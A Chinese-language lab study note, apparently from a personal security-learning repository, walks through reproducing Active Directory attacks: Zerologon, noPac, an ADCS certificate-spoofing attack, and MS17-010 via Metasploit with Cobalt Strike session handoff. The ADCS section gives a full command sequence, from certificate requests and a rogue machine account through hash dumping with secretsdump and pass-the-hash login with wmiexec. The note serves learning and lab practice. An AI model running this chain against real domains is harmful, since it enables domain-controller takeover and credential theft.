# CVE

下面的py基本用的都是py3.8版本的

针对域内的爆出的cve，有的目前还是能用上的，所以也学习一下

### cve-2020-1472  

这里记得拍个快照，因为重置密码后会破坏DC的环境，导致DC叽了

条件：只需要域内一个机器，版本符合。 。还需要修改hosts地址（C:\Windows\System32\drivers\etc\hosts）：修改域名地址，让本地计算机能找到，不修改的话本地计算机就会在外网找符合域名的地址，找不到对应计算机名字。

环境配不好，域加不进去，网络问题，需要更改和DC一一致，这里一拍：

![1733928009187](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942304.png)

 用cve的cve-2020-1472-exploit.py工具，(socks代理已建立)将DC的密码可以置空。将DC当前连接可以不用密码。再用secretsdump.py（使用空密码连接）获取域内的所有hash，（这里密码都置空了，为什么还要获取hash值）这个工具可以不需要密码，但是后面用wmiexec.py（可以rce）连接dc还是需要hash，所以上面还是得先拿到域内hash。

得到Dc主机名和ip地址

![1733928492462](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942305.png)

实战还是有点风险，毕竟将DC置空了，然后用脚本将DC置空（这里有点慢），无论是否能ping通对方Ip，都给我把socks代理搭建起来！！！！！一晚上就省事情，看自己能和DCping通，就没有搭建代理，结果最后就是这个问题，复现成功，置空：

![1733930889223](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942306.png)

![1733930949150](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942307.png)

然后置空后用secretsdump.py脚本进行爆破hash值，将DC下的所以hash爆出来

![1733931096818](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942308.png)

获取的hash值，找到DC的hash:

![1733931204733](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942309.png)

连接域控PTH，拿到shell:

![1733931281558](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942310.png)

操作完记得恢复DC密码，不然DC就崩了

### Cve-2021-42281

 条件：需要一个域内用户的明文账户密码(2012以上不好获取明文)。建立连接，更改hosts。版本符合

这种回显就说明有此漏洞（scoks）：

![1733931718975](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942311.png)

还是用scanner.py工具扫看是否存在漏洞，再用nopac.py进行全自动-----------然后重置一下环境（）翻车--------- 使用kali进行测试，成功。用sam_the_admin.py（hosts也得设置一下，绑定好域名。

报错是因为上一个漏洞将DC打坏了，这里需要恢复一下DC快照

![1733931821853](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942312.png)

恢复后，还是有点问题，所以最后选择用kali版本进行操作。--配好代理。

![1733997980652](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942313.png)

这里我本地DC好像坏了，没有反弹shell成功，不过正常是反弹回来 的

![1733997943625](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942314.png)

经过99810难，重新配置了环境------直接拿到shll：

![1734008376528](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942315.png)

这里web加域时候报错，什么找不到域，无法与域建立连接时候：

![1734008511638](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942316.png)

exe的工具（不推荐使用）：

### cve-2022-26932

ADCS攻击

条件：

![1734008621276](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942317.png)

  域里面需要安装对应证书。一个域内用户机。这里工具在kali上，文档中的命令适用于2023以下certipy3，看看自己的kali是啥时候的，2023以上是Certipyr4，命令会有差异。

检测DC是否有证书：

![1734008693421](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942318.png)



  演示。还是得先配好代理， 这里的目标god机没有安装对应的证书服务，所以测试失败。

  重新换目标机，安装了漏洞利用的证书服务：win2016 ------ xiaodii.local。背景：信息收集好------CS中获取CA结构名和计算机名---------域内信息，kali配置好hosts，kali 代理proxychains配置好。用工具certipy生成一个证书，然后检测，添加一个机器，然后修改机器属性，dnshost和DC一致，在用刚才生成的机器生成证书，在检测证书，然后导出许多域内hash（secretsdump.py），用wmiexec.py利用得到的hash进行建立。注意：这里前面都需要加代理proxychain4命令

这里还是需要配置环境。1、申请低权限用户证书：

certipy req 'xiaodi.lab/test:Pass123@dc.xiaodi.lab' -ca xiaodi-DC-CA -template User -debug 



2、检测证书

certipy auth -pfx test.pfx -dc-ip 192.168.3.111



3、创建一个机器账户：

python3 bloodyAD.py -d xiaodi.lab -u test -p 'Pass123' --host 192.168.3.111 addComputer pwnmachine 'CVEPassword1234*'



4、设置机器账户属性(dNSHostName和DC一致)：

python3 bloodyAD.py -d xiaodi.lab -u test -p 'Pass123' --host 192.168.3.111 setAttribute 'CN=pwnmachine,CN=Computers,DC=xiaodi,DC=lab' dNSHostName '["DC.xiaodi.lab"]'



5、再次申请证书：

certipy req 'xiaodi.lab/pwnmachine$:CVEPassword1234*@192.168.3.111' -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug



6、检测证书：

certipy auth -pfx ./dc.pfx -dc-ip 192.168.3.111



7、导出HASH：

python3 secretsdump.py 'xiaodi.lab/dc$@DC.xiaodi.lab' -hashes :10e02bef2258ad9b239e2281a01827a4



8、利用HASH：

python3 wmiexec.py xiaodi.lab/administrator@192.168.3.111 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd

### CVE-2017-0146

MS17010  ----------- 系统漏洞。直接是对系统打。

这里用msf进行打win7机，msf怎么进行代理通讯呢》所以这里是让目标机直接上线到msf，这里cs首先先有了一个被控机，这里也可以用cs上传直接上传msf,exe后门，但是用另一种方法：将cs的移植到msf上：

 : CS创建监听器、配置msf和监听器对应。spawn 监听器名字。这里为什么正向后门在仔细听听。

![1734009824988](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942319.png)

msf：

![1734010040538](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942320.png)

cs将目标机权限给msf：

![1734010100453](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942321.png)

msf监听到：

![1734010127391](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942322.png)

得到目标web机权限后，添加查看路由，发现3网段有路由：

![1734010333483](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942323.png)

检测模块，检测是否存在漏洞：

![1734010363099](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942324.png)

结果解释：gpt

![1734010428005](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942325.png)

这里msf是cs移交过来的权限，所以选择正向，msf可以找到web机，web机找不到，web机和msf中间有cs。

![1734010531304](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942326.png)

 换一个msf重新进行测试，最后还是小翻车，看第二级---------最后是因为目标机的DC没有开，所以导致没有成功，攻击条件有一个smb协议，DC没有同步过来。

![1734010875985](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942327.png)
